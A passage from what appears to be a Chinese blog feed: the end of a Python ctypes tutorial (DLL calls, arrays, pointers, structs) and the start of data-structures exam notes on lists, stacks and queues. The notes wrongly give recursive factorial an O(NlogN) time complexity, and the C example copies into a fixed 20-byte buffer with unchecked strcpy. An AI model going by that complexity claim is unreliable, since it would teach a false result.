</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython<span class="literal">-input</span><span class="literal">-2</span><span class="literal">-a566ecb9f1d3</span>&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> c_char_p(<span class="string">"hello world."</span>)</span><br><span class="line">TypeError: bytes or integer address expected instead of str instance</span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">3</span>]: c_char_p(b<span class="string">"hello world."</span>)</span><br><span class="line">Out[<span class="number">3</span>]: c_char_p(<span class="number">95498000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">4</span>]: c_wchar_p(<span class="string">"hello world."</span>)</span><br><span class="line">Out[<span class="number">4</span>]: c_wchar_p(<span class="number">102407552</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">5</span>]:</span><br></pre></td></tr></table></figure><hr><h4 id="指针和数组："><a class="header-anchor" href="#指针和数组："></a>指针和数组：</h4><p>以下是一个使用数组和指针的例子：</p><p><code>c/c++</code> code：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        ret += a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum2</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        ret += a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译动态dll库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -shared .\test.c -o test.dll</span><br></pre></td></tr></table></figure><p><code>python</code>使用<code>ctypes</code>数组示例（这里是ipython下的运行效果）：</p><p>运行结果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">In</span> [<span class="number">12</span>]: </span><br><span class="line">...: <span class="comment"># ctypes混合编程，由于gcc版本是32位，所以这里用32位的Python解释器（本机环境python3.8）</span></span><br><span class="line">...: from ctypes import *</span><br><span class="line">...: libc = CDLL(<span class="string">"../c_test/test.dll"</span>)</span><br><span class="line">...: array = (c_int * <span class="number">3</span>)()   <span class="comment"># 这里先生成一个ctypes数组，大小为 3, 记住这种数组定义方法</span></span><br><span class="line">...: array[<span class="number">0</span>] = <span class="number">1</span>            <span class="comment"># 这么写主要是为了直观地展示数组的下标操作</span></span><br><span class="line">...: array[<span class="number">1</span>] = <span class="number">2</span></span><br><span class="line">...: array[<span class="number">2</span>] = <span class="number">3</span></span><br><span class="line">...: print(libc.sum(array, len(array)))</span><br><span class="line"></span><br><span class="line"><span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">13</span>]:</span><br></pre></td></tr></table></figure><p><code>python</code>使用<code>ctypes</code>指针示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ctypes混合编程，由于gcc版本是32位，所以这里用32位的Python解释器（本机环境python3.8）</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libc = CDLL(<span class="string">"../c_test/test.dll"</span>)</span><br><span class="line"></span><br><span class="line">i = c_int(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># POINTER()定义了一个指针类型，argtypes属性先声明了函数调用的形参类型</span></span><br><span class="line">libc.sum2.argtypes = (POINTER(c_int), c_size_t)</span><br><span class="line"><span class="comment"># pointer()操作为取某个变量的指针（这里只能用在ctypes里）</span></span><br><span class="line">print(libc.sum2(pointer(i), <span class="number">1</span>))</span><br><span class="line">print(libc.sum2(i, <span class="number">1</span>))<span class="comment"># 注意当参数为ctypes数据类型时，不取指针传参也是允许的</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">In</span> [<span class="number">5</span>]: i = <span class="number">5</span></span><br><span class="line"><span class="keyword">In</span> [<span class="number">6</span>]: print(pointer(i))</span><br><span class="line">--------------------------------------------------------------------------</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython<span class="literal">-input</span><span class="literal">-6</span><span class="literal">-156c88ee55d9</span>&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> print(pointer(i))</span><br><span class="line">TypeError: _type_ must have storage info</span><br><span class="line"><span class="keyword">In</span> [<span class="number">7</span>]: i = c_int(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">In</span> [<span class="number">8</span>]: print(pointer(i))</span><br><span class="line">&lt;ctypes.wintypes.LP_c_long object at <span class="number">0</span>x04C755C8&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> [<span class="number">9</span>]:</span><br></pre></td></tr></table></figure><p><code>pointer()</code>函数只对<code>ctypes</code>的数据类型有效。</p><hr><h4 id="结构体："><a class="header-anchor" href="#结构体："></a>结构体：</h4><p>需要在python中定义相对应的同样的结构体类型（使用类定义）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StructPointerTest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;StructPointerTest, *StructPointer;</span><br><span class="line"> </span><br><span class="line"><span class="function">StructPointer <span class="title">test</span><span class="params">(<span class="keyword">char</span>* n, <span class="keyword">int</span> a)</span><span class="comment">// 返回结构体指针</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">StructPointer p = (StructPointer)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StructPointerTest)); </span><br><span class="line"><span class="built_in">strcpy</span>(p-&gt;name, n);</span><br><span class="line">p-&gt;age = a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -shared .\struct_ctypes.c -o struct_ctypes.dll</span><br></pre></td></tr></table></figure><p><code>python</code>使用结构体示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ctypes混合编程，由于gcc版本是32位，所以这里用32位的Python解释器（本机环境python3.8）</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StructPointerTest</span><span class="params">(Structure)</span>:</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">'name'</span>, c_char * <span class="number">20</span>),</span><br><span class="line">        (<span class="string">'age'</span>, c_int),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">libc = CDLL(<span class="string">"../c_test/struct_ctypes.dll"</span>)</span><br><span class="line"><span class="comment"># 这里指定ctypes函数的返回值为结构体</span></span><br><span class="line">libc.test.restype = POINTER(StructPointerTest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以用上面定义的结构体接收dll中函数返回值</span></span><br><span class="line">p = libc.test(<span class="string">b"hello"</span>, <span class="number">20</span>)</span><br><span class="line">print(p.contents.name, p.contents.age)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以在python中直接赋值</span></span><br><span class="line">s = StructPointerTest(<span class="string">b"abcde"</span>, <span class="number">12</span>)</span><br><span class="line">print(s.name, s.age)</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">In</span> [<span class="number">12</span>]: <span class="comment"># ctypes混合编程，由于gcc版本是32位，所以这里用32位的Python解释器（本机环境python3.8） </span></span><br><span class="line">                                                             </span><br><span class="line">...: from ctypes import *                                        </span><br><span class="line">...:                                                              </span><br><span class="line">...: <span class="class"><span class="keyword">class</span> <span class="title">StructPointerTest</span>(<span class="title">Structure</span>):                          </span></span><br><span class="line"><span class="class">...:     _<span class="title">fields_</span> = [                                             </span></span><br><span class="line"><span class="class">...:         ('<span class="title">name</span>', <span class="title">c_char</span> * 20),                               </span></span><br><span class="line"><span class="class">...:         ('<span class="title">age</span>', <span class="title">c_int</span>),                                      </span></span><br><span class="line"><span class="class">...:     ]                                                        </span></span><br><span class="line"><span class="class">...: <span class="title">libc</span> = <span class="title">CDLL</span>("../<span class="title">c_test</span>/<span class="title">struct_ctypes</span>.<span class="title">dll</span>")                   </span></span><br><span class="line"><span class="class">...:                                                              </span></span><br><span class="line"><span class="class">...: # 这里指定<span class="title">ctypes</span>函数的返回值为结构体                         </span></span><br><span class="line"><span class="class">...: <span class="title">libc</span>.<span class="title">test</span>.<span class="title">restype</span> = <span class="title">POINTER</span>(<span class="title">StructPointerTest</span>)               </span></span><br><span class="line"><span class="class">...:                                                              </span></span><br><span class="line"><span class="class">...: # 可以用上面定义的结构体接收<span class="title">dll</span>中函数返回值                  </span></span><br><span class="line"><span class="class">...: <span class="title">p</span> = <span class="title">libc</span>.<span class="title">test</span>(<span class="title">b</span>"<span class="title">hello</span>", 20)                                 </span></span><br><span class="line"><span class="class">...: <span class="title">print</span>(<span class="title">p</span>.<span class="title">contents</span>.<span class="title">name</span>, <span class="title">p</span>.<span class="title">contents</span>.<span class="title">age</span>)                       </span></span><br><span class="line"><span class="class">...:                                                              </span></span><br><span class="line"><span class="class">...: # 也可以在<span class="title">python</span>中直接赋值                                   </span></span><br><span class="line"><span class="class">...: <span class="title">s</span> = <span class="title">StructPointerTest</span>(<span class="title">b</span>"<span class="title">abcde</span>", 12)                          </span></span><br><span class="line"><span class="class">...: <span class="title">print</span>(<span class="title">s</span>.<span class="title">name</span>, <span class="title">s</span>.<span class="title">age</span>)                                     </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">b</span>'<span class="title">hello</span>' 20                                                       </span></span><br><span class="line"><span class="class"><span class="title">b</span>'<span class="title">abcde</span>' 12</span></span><br></pre></td></tr></table></figure><p>到这里<code>ctypes</code>库的基本使用就没问题了。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 调试器 </tag>
            
            <tag> ctypes </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构复习笔记</title>
      <link href="/p/fd4fe3ba.html"/>
      <url>/p/fd4fe3ba.html</url>
      
        <content type="html"><![CDATA[<h1>数据结构</h1><h2 id="第一章：数据结构的"><a class="header-anchor" href="#第一章：数据结构的"></a>第一章：数据结构的</h2><p>基本概念</p><h3 id="定义"><a class="header-anchor" href="#定义"></a>定义</h3><ul><li>在任何问题中，数据元素都不是孤立存在的，而是在它们之间存在着某种关系，这种数据元素相互之间的关系称为结构（Structure）。数据结构是相互之间存在一种或多种特定关系的数据元素的集合。数据结构包括三方面的内容：逻辑结构、存储结构和数据的运算。数据的逻辑结构和存储结构是密不可分的两个方面，一个算法的设计取决于所选定的逻辑结构，而算法的实现依赖于所采用的存储结构。</li></ul><h3 id="逻辑结构"><a class="header-anchor" href="#逻辑结构"></a>逻辑结构</h3><ul><li><p>逻辑结构是指数据元素之间的逻辑关系，即从逻辑关系上描述数据。它与数据的存储无关，是独立于计算机的</p></li><li><p>数据的逻辑结构分为线性结构和非线性结构</p><ul><li>集合 结构中的数据元素之间除了“同属于一个集合”的关系外，别无其他关系。 类似于数学上的集合</li><li>线性结构 结构中的数据元素之间只存在一对一的关系。比如排队</li><li>树形结构 结构中的数据元素之间存在一对多的关系。比如家族族谱</li><li>图状结构或网状结构 结构中的数据元素之间存在多对多的关系。 比如地图</li></ul>  <a id="more"></a></li></ul><h3 id="物理结构"><a class="header-anchor" href="#物理结构"></a>物理结构</h3><ul><li>存储结构是指数据结构在计算机中的表示（又称映像），也称物理结构。它包括数据元素的表示和关系的表示。数据的存储结构是逻辑结构用计算机语言的实现，它依赖于计算机语言。数据的存储结构主要有：顺序存储、链式存储、索引存储和散列存储。<ul><li>顺序存储：存储的物理位置相邻。（p.s. 物理位置即信息在计算机中的位置。）</li><li>链接存储：存储的物理位置未必相邻，通过记录相邻元素的物理位置来找到相邻元素。</li><li>索引存储：类似于目录，以后可以联系操作系统的文件系统章节来理解。</li><li>散列存储：通过关键字直接计算出元素的物理地址（以后详解）。</li></ul></li></ul><h3 id="算法的五个特征"><a class="header-anchor" href="#算法的五个特征"></a>算法的五个特征</h3><ul><li>1，有穷性：有限步之后结束</li><li>2，确定性：不存在二义性，即没有歧义</li><li>3，可行性：比如受限于计算机的计算能力，有些算法虽然理论上可行，但实际上无法完成。</li><li>4，输入：能被计算机处理的各种类型数据，如数字，音频，图像等等。</li><li>5，输出：一至多个程序输出结果。</li></ul><h3 id="算法的复杂度"><a class="header-anchor" href="#算法的复杂度"></a>算法的复杂度</h3><ul><li>时间复杂度：<ul><li>• 它用来衡量算法随着问题规模增大，算法执行时间增长的快慢；</li><li>• 是问题规模的函数：T(n)是时间规模函数 时间复杂度主要分析T(n)的数量级</li><li>• T(n)=O(f(n)) f(n)是算法中基本运算的频度 一般我们考虑最坏情况下的时间复杂度</li></ul></li><li>空间复杂度：<ul><li>• 它用来衡量算法随着问题规模增大，算法所需空间的快慢；</li><li>• 是问题规模的函数：S(n)=O(g(n)) ；算法所需空间的增长率和g(n)的增长率相同。</li></ul></li></ul><h3 id="概要-复杂度计算为重点"><a class="header-anchor" href="#概要-复杂度计算为重点"></a>概要: 复杂度计算为重点</h3><ul><li>常用的时间复杂度大小关系：</li><li>复杂度如何计算<ul><li>时间复杂度计算（单个循环体）<ul><li>直接关注循环体的执行次数，设为k</li></ul></li><li>时间复杂度计算（多个循环体）<ul><li>两个运算规则：乘法规则，加法规则。</li></ul></li></ul></li></ul><h2 id="第二章：线性表"><a class="header-anchor" href="#第二章：线性表"></a>第二章：线性表</h2><h3 id="线性表的逻辑结构"><a class="header-anchor" href="#线性表的逻辑结构"></a>线性表的逻辑结构</h3><ul><li>定义：线性表是具有相同数据类型的n（n≥0）个数据元素的有限序列。其中n为表长。当n=0时 线性表是一个空表</li><li>特点：线性表中第一个元素称为表头元素；最后一个元素称为表尾元素。<br>除第一个元素外，每个元素有且仅有一个直接前驱。<br>除最后一个元素外，每个元素有且仅有一个直接后继。</li></ul><h3 id="线性表的顺序存储结构"><a class="header-anchor" href="#线性表的顺序存储结构"></a>线性表的顺序存储结构</h3><ul><li>线性表的顺序存储又称为顺序表。<br>它是用一组地址连续的存储单元（比如C语言里面的数组），依次存储线性表中的数据元素，从而使得逻<br>辑上相邻的两个元素在物理位置上也相邻。</li><li>建立顺序表的三个属性:<br>1.存储空间的起始位置（数组名data）<br>2.顺序表最大存储容量（MaxSize）<br>3.顺序表当前的长度（length）</li><li>其实数组还可以动态分配空间，存储数组的空间是在程序执行过程中通过动态存储分配语句分配</li><li>总结：<ul><li>1.顺序表最主要的特点是随机访问（C语言中基于数组），即通过首地址和元素序号可以在O(1)的时间内找到指定的元素。</li><li>2.顺序表的存储密度高，每个结点只存储数据元素。无需给表中元素花费空间建立它们之间的逻辑关系（因为物理位置相邻特性决定）</li><li>3.顺序表逻辑上相邻的元素物理上也相邻，所以插入和删除操作需要移动大量元素。</li></ul></li></ul><h3 id="顺序表的操作"><a class="header-anchor" href="#顺序表的操作"></a>顺序表的操作</h3><ul><li>1.插入<ul><li>算法思路：<ul><li>1.判断i的值是否正确</li><li>2.判断表长是否超过数组长度</li><li>3.从后向前到第i个位置，分别将这些元素都向后移动一位</li><li>4.将该元素插入位置i 并修改表长</li></ul></li><li>代码</li><li>分析：<ul><li>最好情况：在表尾插入（即i=n+1），元素后移语句将不执行，时间复杂度为O(1)。</li><li>最坏情况：在表头插入（即i=1），元素后移语句将执行<br>n次，时间复杂度为O(n)。</li><li>平均情况：假设pi（pi=1/(n+1) ）是在第i个位置上插入<br>一个结点的概率，则在长度为n的线性表中插入一个结<br>点时所需移动结点的平均次数为</li></ul></li></ul></li><li>2.删除<ul><li>算法思路：<ul><li>1.判断i的值是否正确</li><li>2.取删除的元素</li><li>3.将被删元素后面的所有元素都依次向前移动一位</li><li>4.修改表长</li></ul></li><li>代码</li><li>分析<ul><li>最好情况：删除表尾元素（即i=n），无须移动元素，时间复杂度为O(1)。</li><li>最坏情况：删除表头元素（即i=1），需要移动除第一个元素外的所有元素，时间复杂度为O(n)。</li><li>平均情况：假设pi(pi=1/n)是删除第i个位置上结点的概率，则在长度为n的线性表中删除一个结点时所需移动结点的平均次数为</li></ul></li></ul></li></ul><h3 id="线性表的链式存储结构"><a class="header-anchor" href="#线性表的链式存储结构"></a>线性表的链式存储结构</h3><ul><li>线性表的链式存储是指通过一组任意的存储单元来存储线性表中的数据元素。</li><li>头结点和头指针的区别？<ul><li>不管带不带头结点，头指针始终指向链表的第一个结点，而头结点是带头结点链表中的第一个结点，结点内通常不存储信息</li></ul></li><li>为什么要设置头结点？<ul><li>1.处理操作起来方便 例如：对在第一元素结点前插入结点和删除第一结点起操作与其它结点的操作就统一了</li><li>2.无论链表是否为空，其头指针是指向头结点的非空指针，因此空表和非空表的处理也就统一了。</li></ul></li></ul><h3 id="单链表的操作"><a class="header-anchor" href="#单链表的操作"></a>单链表的操作</h3><ul><li>1.头插法建立单链表：<ul><li>建立新的结点分配内存空间，将新结点插入到当前链表的表头</li><li>代码</li></ul></li><li>2.尾插法建立单链表：<ul><li>建立新的结点分配内存空间，将新结点插入到当前链表的表尾</li><li>代码</li></ul></li><li>3.按序号查找结点<ul><li>在单链表中从第一个结点出发，顺指针next域逐个往下搜索，直到找到第i个结点为止,否则返回最后一个结点指针域NULL。</li><li>代码</li></ul></li><li>4.按值查找结点<ul><li>从单链表第一个结点开始，由前往后依次比较表中各结点数据域的值，若某结点数据域的值等于给定值e，则返回该结点的指针；若整个单链表中没有这样的结点，则返回NULL。</li><li>代码</li></ul></li><li>5．插入<ul><li>插入操作是将值为x的新结点插入到单链表的第i个位置上。先检查插入位置的合法性，然后找到待插入位置的前驱结点，即第i−1个结点，再在其后插入新结点。</li><li>算法思路：<br>1.取指向插入位置的前驱结点的指针<br>① p=GetElem(L,i-1);<br>2.令新结点<em>s的指针域指向</em>p的后继结点<br>② s-&gt;next=p-&gt;next;<br>3.令结点<em>p的指针域指向新插入的结点</em>s<br>③ p-&gt;next=s;</li></ul></li><li>6．删除<ul><li>删除操作是将单链表的第i个结点删除。先检查删除位置的合法性，然后查找表中第i−1个结点，即被删结点的前驱结点，再将其删除。</li><li>算法思路：<br>1.取指向删除位置的前驱结点的指针 p=GetElem(L,i-1);<br>2.取指向删除位置的指针 q=p-&gt;next;<br>3.p指向结点的后继指向被删除结点的后继 p-&gt;next=q-&gt;next<br>4.释放删除结点 free(q);</li></ul></li></ul><h3 id="双链表"><a class="header-anchor" href="#双链表"></a>双链表</h3><ul><li>定义</li><li>1.插入：(方法不唯一)<br>① s-&gt;next=p-&gt;next;<br>② p-&gt;next-&gt;prior=s;<br>③ s-&gt;prior=p;<br>④ p-&gt;next=s;</li><li>2.删除：<br>① p-&gt;next=q-&gt;next;<br>② q-&gt;next-&gt;prior=p;<br>③ free(q);</li></ul><h3 id="循环链表-静态链表"><a class="header-anchor" href="#循环链表-静态链表"></a>循环链表&amp;&amp;静态链表</h3><ul><li>循环单链表：循环单链表和单链表的区别在于，表中最后一个结点的指针不是NULL，而改为指向头结点，从而整个链表形成一个环</li><li>循环双链表：类比循环单链表，循环双链表链表区别于双链表就是首尾结点构成环<ul><li>当循环双链表为空表时，其头结点的prior域和next域都等于Head。</li></ul></li><li>静态链表：静态链表是用数组来描述线性表的链式存储结构。<ul><li>数组第一个元素不存储数据，它的指针域存储第一个元素所在的数组下标。链表最后一个元素的指针域值为-1。</li><li>例子</li></ul></li></ul><h2 id="第三章：栈和队列"><a class="header-anchor" href="#第三章：栈和队列"></a>第三章：栈和队列</h2><h3 id="栈"><a class="header-anchor" href="#栈"></a>栈</h3><ul><li>栈（Stack）：只允许在一端进行插入或删除操作的线性表。</li><li>栈顶（Top）：线性表允许进行插入和删除的那一端。</li><li>栈底（Bottom）：固定的，不允许进行插入和删除的另一端</li><li>特点：<br>1.栈是受限的线性表，所以自然具有线性关<br>系。<br>2.栈中元素后进去的必然先出来，即后进先出<br>LIFO（Last In First Out）<ul><li>栈中元素后进<br>去的必然先出<br>来，即后进先<br>出LIFO（Last In<br>First Out）</li></ul></li><li>顺序栈<ul><li>栈是线性表的特例，那栈的顺序存储也是线性表顺序存储的简化。栈的顺序存储结构也叫作顺序栈。</li><li>顺序栈的操作<ul><li>1.判空：</li><li>2.进栈：</li><li>3.出栈：</li><li>4.读取栈顶元素：</li></ul></li></ul></li><li>共享栈<ul><li>顺序栈的存储空间大小需要事先开辟好，很多时候对每个栈各自单独开辟存储空间的利用率不如将各个栈的存储空间共享</li><li>示意图</li><li>共享栈的结构</li><li>共享栈的操作：（进栈）</li></ul></li><li>链式栈<ul><li>栈是线性表的特例，线性表的存储结构还有链式存储结构，所以也可以用链表的方式来实现栈。栈的链式存储结构也叫作链栈。</li><li>特点<br>1.链栈一般不存在栈满的情况。<br>2.空栈的判定条件通常定为top==NULL；</li><li>结构</li><li>链式栈的操作<ul><li>1.进栈</li><li>2.出栈</li></ul></li></ul></li></ul><h3 id="队列"><a class="header-anchor" href="#队列"></a>队列</h3><ul><li>队列是只允许在一端进行插入，而在另一端进行删除的线性表</li><li>队头（Front）：允许删除的一端，又称为队首。</li><li>队尾（Rear）： 允许插入的一端。</li><li>先进入队列的元素必然先离开队列，即先进先出（First In First Out）简称FIFO</li><li>顺序队列<ul><li>用数组来实现队列，可以将队首放在数组下标为0的位置。</li></ul></li><li>循环队列<ul><li>把数组“掰弯”，形成一个环。Rear指针到了下标为4的位置还能继续指回到下标为0的地方。这样首尾相连的顺序存储的队列就叫循环队列</li><li>入队：rear=(rear+1)%MaxSize</li><li>出队：front=(front+1)%MaxSize</li><li>循环队列的操作<ul><li>1.入队：</li><li>2.出队：</li></ul></li><li>概要: 那如何分辨队列是空还是满呢？<ul><li>方法一：设置标志位flag，当flag=0且rear等于front时为队列空，当flag=1且rear等于front时为队列满。</li><li>方法二：我们把front=rear仅作为队空的判定条件。当队列满的时候，令数组中仍然保留一个空余单元。我们认为这种情况就是队列满了。</li></ul></li></ul></li><li>链式队列<ul><li>队列的链式存储结构，其实就是线性表的单链表，只不过需要加点限制，只能表尾插入元素，表头删除元素。</li><li>为了方便操作，我们分别设置队头指针和队尾指针，队头指针指向头结点，队尾指针指向尾结点。</li><li>链式队列的操作<ul><li><p>1.入队：我们知道队列只能从队尾插入元素，队头删除元素。于是入队就是在队尾指针进行插入结点操作。链队的插入操作和单链表的插入操作是一致的。</p></li><li><p>2.出队：出队就是头结点的后继结点出队，然后将头结点的后继改为它后面的结点。</p></li></ul></li></ul></li><li>双端队列<ul><li>双端队列是指允许两端都可以进行入队和出队操作的队列</li></ul></li></ul><h3 id="栈的应用"><a class="header-anchor" href="#栈的应用"></a>栈的应用</h3><ul><li>1、括号匹配：假设有两种括号，一种圆的()，一种方的[]，嵌套的顺序是任意的。<ul><li><p>算法思想：若是左括号，入栈；若是右括号，出栈一个左括号判断是否与之匹配；检验到字符串尾，还要检查栈是否为空。只有栈空，整个字符串才是括号匹配的。</p></li><li><p>代码</p></li></ul></li><li>2、表达式求值：<br>*<ul><li>规则：从左到右扫描表达式的每个数字和符号，遇到数字就进栈，遇到符号就将处于栈顶的两个数字出栈然后跟这个符号进行运算，最后将运算结果进栈，直到最终获得结果。</li></ul></li><li>3、递归：<ul><li>要理解递归，你要先理解递归，直到你能理解递归。<br>如果在一个函数、过程或数据结构的定义中又应用了它自身，那么这个函数、过程或数据结构称为是递归定义的，简称递归。递归最重要的是递归式和递归边界。</li><li>1.阶乘<ul><li>时间复杂度：O(NlogN)</li></ul></li><li>2.斐波那契数列<ul><li>时间复杂度   O(2^n)</li></ul></li></ul></li><li>概要: 如何将中缀表达式转换成后缀表达式？<ul><li>1.按运算符优先级对所有运算符和它的运算数加括号。(原本的括号不用加)</li><li>2.把运算符移到对应的括号后。</li><li>3.去掉括号。</li><li>例子</li></ul></li></ul><h2 id="第四章：树"><a class="header-anchor" href="#第四章：树"></a>第四章：树</h2><h3 id="树的基本概念"><a class="header-anchor" 